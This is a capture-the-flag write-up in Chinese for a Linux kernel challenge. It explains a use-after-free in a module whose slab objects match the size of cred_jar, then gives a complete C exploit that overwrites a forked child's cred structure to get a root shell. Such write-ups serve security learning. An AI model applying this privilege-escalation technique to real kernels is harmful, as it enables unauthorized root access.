# Digging into Kernel
简单的kernel题。模块申请0xC0(192字节)大小作为新的slab对象，它恰好是`cred_jar`的大小，并且在`release`时并未将释放的指针清零，存在UAF漏洞。我们在父进程申请一个堆块后将文件描述符关闭构成UAF，然后`fork`子进程，在子进程重新`kmem_cache_create`时会得到刚才释放的堆块，利用父进程产生的UAF修改子进程的`cred`结构体即可提升权限。
```C
/*
 * @Author: unr4v31
 * @Date: 2022-01-23 20:19:15
 * @LastEditTime: 2022-01-28 11:16:13
 * @LastEditors: unr4v31
 * @Description: get root
 * @FilePath: /rawkkk/exp.c
 */

#include<stdlib.h>
#include<stdio.h>
#include<sys/ioctl.h>
#include<fcntl.h>
#include<sys/types.h>
#include<string.h>
#include<linux/fs.h>
#include<wait.h>

struct xkmod
{
    void* from;
    unsigned int offset;
    unsigned int len;
};

struct xkmod *buf;

void add(int fd)
{
    ioctl(fd,0x1111111,buf);
}

void copytouser(int fd)
{
    ioctl(fd,0x7777777,buf);
}

void copyfromuser(int fd)
{
    ioctl(fd,0x6666666,buf);
}

int main()
{
    int fd = open("/dev/xkmod",O_RDONLY);
    if (fd < 0)
    {
        puts("[x] open error");
        exit(0);
    }

    buf = malloc(sizeof(struct xkmod));
    buf->from = malloc(0x100);

    add(fd);
    close(fd);

    int pid = fork();
    if (pid < 0)
    {
        puts("[x] fork error");
        exit(0);
    }

    if(pid==0)
    {
        printf("[!] pid : %d\n",pid);
        fd = open("/dev/xkmod",O_RDONLY);
        memset(buf->from,0,sizeof(buf->from));
        buf->offset = 0;
        buf->len = 0x28;
        copyfromuser(fd);
        system("/bin/sh");
        exit(0);
    }    
    else
    {
        puts("[!] child process");
        int status;
        wait(&status);
    }
    return 0;
}

```